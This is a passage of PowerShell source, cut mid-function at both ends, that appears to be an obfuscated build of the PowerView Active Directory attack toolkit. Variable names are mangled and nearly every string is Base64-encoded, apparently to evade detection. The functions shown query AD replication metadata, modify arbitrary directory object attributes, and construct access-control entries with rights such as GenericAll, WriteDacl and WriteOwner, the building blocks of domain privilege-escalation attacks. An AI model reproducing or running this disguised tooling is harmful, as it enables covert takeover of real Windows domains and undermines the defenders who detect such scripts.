                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAdAB0AHIAaQBiAHUAdABlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIAAnAG0AcwBkAHMALQByAGUAcABsAGEAdAB0AHIAaQBiAHUAdABlAG0AZQB0AGEAZABhAHQAYQAnACAAZgBvAHIAIAAnACQAewAvAD0AXAAvAFwALwBcAF8ALwA9AFwALwBcAC8APQBcAF8AfQAnAA==')))
                }
            }
        }
    }
}
function Get-DomainObjectLinkedAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${_/==\_/\/====\/\_} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            ${_/==\_/\/====\/\_} = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ___/\___/\__/===\/ @/=\___/=\__/=\/\/ | % {
            ${/=\/\/\_/=\/\/=\_} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${/===\/=\__/=\_/\_} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                ${___/===\/\/=\_/==} = [xml]${/===\/=\__/=\_/\_} | select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if (${___/===\/\/=\_/==}) {
                    if (${___/===\/\/=\_/==}.pszAttributeName -Match ${_/==\_/\/====\/\_}) {
                        ${__/\/\/\_/\/\/=\/} = New-Object PSObject
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${/=\/\/\_/=\/\/=\_}
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) ${___/===\/\/=\_/==}.pszAttributeName
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAVgBhAGwAdQBlAA=='))) ${___/===\/\/=\_/==}.pszObjectDn
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBDAHIAZQBhAHQAZQBkAA=='))) ${___/===\/\/=\_/==}.ftimeCreated
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) ${___/===\/\/=\_/==}.ftimeDeleted
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${___/===\/\/=\_/==}.ftimeLastOriginatingChange
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) ${___/===\/\/=\_/==}.dwVersion
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${___/===\/\/=\_/==}.pszLastOriginatingDsaDN
                        ${__/\/\/\_/\/\/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQATABpAG4AawBlAGQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        ${__/\/\/\_/\/\/=\/}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEwAaQBuAGsAZQBkAEEAdAB0AHIAaQBiAHUAdABlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIAAnAG0AcwBkAHMALQByAGUAcABsAHYAYQBsAHUAZQBtAGUAdABhAGQAYQB0AGEAJwAgAGYAbwByACAAJwAkAHsALwA9AFwALwBcAC8AXABfAC8APQBcAC8AXAAvAD0AXABfAH0AJwA=')))
                }
            }
        }
    }
}
function Set-DomainObject {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{'Raw' = $True}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ${___/==\_/\_/=\___} = ___/\___/\__/===\/ @/=\___/=\__/=\/\/
        ForEach ($Object in ${___/==\_/\_/=\___}) {
            ${__/======\_/\/=\/} = ${___/==\_/\_/=\___}.GetDirectoryEntry()
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))].GetEnumerator() | % {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$(${___/==\_/\_/=\___}.Properties.samaccountname)'"
                        ${__/======\_/\/=\/}.put($_.Name, $_.Value)
                    }
                    ${__/======\_/\/=\/}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$(${___/==\_/\_/=\___}.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))].GetEnumerator() | % {
                        ${__/=\/\/\____/=\_} = $_.Name
                        ${/==\/=\_/===\__/=} = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '${__/=\/\/\____/=\_}' with '${/==\/=\_/===\__/=}' for object '$(${___/==\_/\_/=\___}.Properties.samaccountname)'"
                        ${/======\/\/\/==\_} = ${__/======\_/\/=\/}.${__/=\/\/\____/=\_}[0].GetType().name
                        ${__/\_/=\/===\__/\} = $(${__/======\_/\/=\/}.${__/=\/\/\____/=\_}) -bxor ${/==\/=\_/===\__/=}
                        ${__/======\_/\/=\/}.${__/=\/\/\____/=\_} = ${__/\_/=\/===\__/\} -as ${/======\/\/\/==\_}
                    }
                    ${__/======\_/\/=\/}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$(${___/==\_/\_/=\___}.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))] | % {
                        ${__/=\/\/\____/=\_} = $_
                        Write-Verbose "[Set-DomainObject] Clearing '${__/=\/\/\____/=\_}' for object '$(${___/==\_/\_/=\___}.Properties.samaccountname)'"
                        ${__/======\_/\/=\/}.${__/=\/\/\____/=\_}.clear()
                    }
                    ${__/======\_/\/=\/}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$(${___/==\_/\_/=\___}.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function ConvertFrom-LDAPLogonHours {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )
    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAEgAbwB1AHIAcwBBAHIAcgBhAHkAIABpAHMAIAB0AGgAZQAgAGkAbgBjAG8AcgByAGUAYwB0ACAAbABlAG4AZwB0AGgA')))
        }
        function __/\/\_/==\/====\_ {
            Param (
                [int[]]
                ${_/==\___/\_/=\__/=}
            )
            ${__/\____/=\_/\/\/} = New-Object bool[] 24
            for(${/==\__/===\__/\__}=0; ${/==\__/===\__/\__} -lt 3; ${/==\__/===\__/\__}++) {
                ${/==\/==\/\/\/\___} = ${_/==\___/\_/=\__/=}[${/==\__/===\__/\__}]
                ${__/===\/=\/\__/\/=} = ${/==\__/===\__/\__} * 8
                ${/=\_/==\___/=\_/\} = [Convert]::ToString(${/==\/==\/\/\/\___},2).PadLeft(8,'0')
                ${__/\____/=\_/\/\/}[${__/===\/=\/\__/\/=}+0] = [bool] [convert]::ToInt32([string]${/=\_/==\___/=\_/\}[7])
                ${__/\____/=\_/\/\/}[${__/===\/=\/\__/\/=}+1] = [bool] [convert]::ToInt32([string]${/=\_/==\___/=\_/\}[6])
                ${__/\____/=\_/\/\/}[${__/===\/=\/\__/\/=}+2] = [bool] [convert]::ToInt32([string]${/=\_/==\___/=\_/\}[5])
                ${__/\____/=\_/\/\/}[${__/===\/=\/\__/\/=}+3] = [bool] [convert]::ToInt32([string]${/=\_/==\___/=\_/\}[4])
                ${__/\____/=\_/\/\/}[${__/===\/=\/\__/\/=}+4] = [bool] [convert]::ToInt32([string]${/=\_/==\___/=\_/\}[3])
                ${__/\____/=\_/\/\/}[${__/===\/=\/\__/\/=}+5] = [bool] [convert]::ToInt32([string]${/=\_/==\___/=\_/\}[2])
                ${__/\____/=\_/\/\/}[${__/===\/=\/\__/\/=}+6] = [bool] [convert]::ToInt32([string]${/=\_/==\___/=\_/\}[1])
                ${__/\____/=\_/\/\/}[${__/===\/=\/\__/\/=}+7] = [bool] [convert]::ToInt32([string]${/=\_/==\___/=\_/\}[0])
            }
            ${__/\____/=\_/\/\/}
        }
    }
    Process {
        ${__/\/\/\_/\/\/=\/} = @{
            Sunday = __/\/\_/==\/====\_ -_/==\___/\_/=\__/= $LogonHoursArray[0..2]
            Monday = __/\/\_/==\/====\_ -_/==\___/\_/=\__/= $LogonHoursArray[3..5]
            Tuesday = __/\/\_/==\/====\_ -_/==\___/\_/=\__/= $LogonHoursArray[6..8]
            Wednesday = __/\/\_/==\/====\_ -_/==\___/\_/=\__/= $LogonHoursArray[9..11]
            Thurs = __/\/\_/==\/====\_ -_/==\___/\_/=\__/= $LogonHoursArray[12..14]
            Friday = __/\/\_/==\/====\_ -_/==\___/\_/=\__/= $LogonHoursArray[15..17]
            Saturday = __/\/\_/==\/====\_ -_/==\___/\_/=\__/= $LogonHoursArray[18..20]
        }
        ${__/\/\/\_/\/\/=\/} = New-Object PSObject -Property ${__/\/\/\_/\/\/=\/}
        ${__/\/\/\_/\/\/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ASABvAHUAcgBzAA=='))))
        ${__/\/\/\_/\/\/=\/}
    }
}
function New-ADObjectAccessControlEntry {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,
        [Guid]
        $InheritedObjectType
    )
    Begin {
        if ($PrincipalIdentity -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
            ${___/=\/==\/\_/==\} = @{
                'Identity' = $PrincipalIdentity
                'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${_/=\/\_/\____/\__} = ___/\___/\__/===\/ @___/=\/==\/\_/==\
            if (-not ${_/=\/\_/\____/\__}) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
            }
            elseif(${_/=\/\_/\____/\__}.Count -gt 1) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5ACAAbQBhAHQAYwBoAGUAcwAgAG0AdQBsAHQAaQBwAGwAZQAgAEEARAAgAG8AYgBqAGUAYwB0AHMALAAgAGIAdQB0ACAAbwBuAGwAeQAgAG8AbgBlACAAaQBzACAAYQBsAGwAbwB3AGUAZAA=')))
            }
            ${__/\_/=\__/=\__/\} = ${_/=\/\_/\____/\__}.objectsid
        }
        else {
            ${__/\_/=\__/=\__/\} = $PrincipalIdentity
        }
        ${__/==\/\___/==\_/} = 0
        foreach(${/===\___/\/=\/\/=} in $Right) {
            ${__/==\/\___/==\_/} = ${__/==\/\___/==\_/} -bor (([System.DirectoryServices.ActiveDirectoryRights]${/===\___/\/=\/\/=}).value__)
        }
        ${__/==\/\___/==\_/} = [System.DirectoryServices.ActiveDirectoryRights]${__/==\/\___/==\_/}
        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${__/\_/=\__/=\__/\})
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AFIAdQBsAGUAVAB5AHAAZQA=')))) {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AuditFlag, $ObjectType, $InheritanceType
